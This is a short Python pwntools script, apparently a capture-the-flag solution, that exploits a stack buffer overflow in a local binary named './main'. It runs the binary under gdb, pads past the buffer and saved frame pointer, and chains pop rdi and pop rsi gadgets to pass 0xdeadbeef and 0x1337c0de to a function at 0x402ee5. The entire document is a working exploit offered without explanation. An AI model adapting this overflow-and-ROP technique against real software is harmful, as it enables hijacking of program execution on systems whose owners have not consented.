from pwn import *

p = gdb.debug('./main','b * main')

payload = b'A' * 64
payload +=  b'B' * 8 
payload += p64(0x4038ad) #pop rdi , pop rbp, ret
payload += p64(0xdeadbeef)
payload += b'C' * 8

payload += p64(0x423e9e) # pop rsi, ret
payload += p64(0x1337c0de)
payload += p64(0x402ee5)
p.sendline(payload)

p.interactive()
